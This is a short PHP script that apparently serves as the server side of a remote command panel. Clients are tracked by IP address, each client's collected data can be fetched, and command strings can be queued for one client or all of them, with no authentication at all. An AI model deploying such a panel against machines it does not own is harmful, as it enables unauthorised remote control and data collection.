<?php

error_reporting(E_ALL);

$dir_data = 'data';
$dir_cmds = 'cmds';

function check_user($dir, $ip) {
	if (ip2long($ip) === false || !file_exists($dir.'/'.$ip))
		die();
}
function get_users($dir) {
	$files = scandir($dir);
	$files = array_filter($files, function($f) {
		return $f[0] != '.';
	});
	return array_values($files);
}

$req = $_POST['req'];

if ($req === 'get_users') {
	$users = get_users($dir_data);
	echo json_encode($users);
}
else if ($req === 'get_data') {
	$user = $_POST['user'];
	check_user($dir_data, $user);
	
	echo file_get_contents($dir_data.'/'.$user);
}
else if ($req === 'put_cmd') {
	$user = $_POST['user'];
	$cmd  = $_POST['cmd'];
	check_user($dir_data, $user);
	
	file_put_contents($dir_cmds.'/'.$user, $cmd);
}
else if ($req === 'put_cmd_all') {
	$cmd  = $_POST['cmd'];
	
	$users = get_users($dir_data);
	foreach($users as $user) {
		file_put_contents($dir_cmds.'/'.$user, $cmd);
	}
}
?>